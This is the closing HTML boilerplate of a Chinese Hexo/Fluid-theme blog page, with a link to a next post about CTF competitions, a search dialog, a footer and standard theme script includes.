                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/08/01/%E8%99%8E%E7%AC%A6%E3%80%81DSCTF%E3%80%81%E5%BC%BA%E7%BD%91%E7%9A%84%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/">
                        <span class="hidden-mobile">虎符、DSCTF、强网的简单记录</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  

  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
  






  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>















<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
